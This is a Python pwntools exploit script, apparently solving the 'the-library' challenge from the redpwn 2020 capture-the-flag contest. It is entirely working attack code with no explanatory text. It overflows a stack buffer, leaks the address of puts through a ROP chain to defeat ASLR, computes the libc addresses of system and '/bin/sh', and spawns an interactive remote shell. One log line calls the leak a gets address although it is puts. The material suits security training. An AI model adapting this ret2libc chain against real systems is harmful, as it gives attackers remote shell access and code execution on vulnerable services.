
from pwn import *

r = remote('2020.redpwnc.tf', 31350)
# r = process('./the-library')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
elf = ELF('./the-library')

puts_off = libc.sym['puts']

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

main = 0x400637

pop_rdi = 0x400733  # pop rdi; ret;

p = b'A' * 24
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.readline()
r.sendline(p)
r.readline()

s = r.recv().split()

leak = int.from_bytes(s[1], byteorder='little')

LIBC_BASE = leak - puts_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print()
log.info('gets address:      ' + hex(leak))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address:    ' + hex(ADDR_SYSTEM))
log.info('/bin/sh address:   ' + hex(ADDR_BINSH))
print()

p = b'B' * 24
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
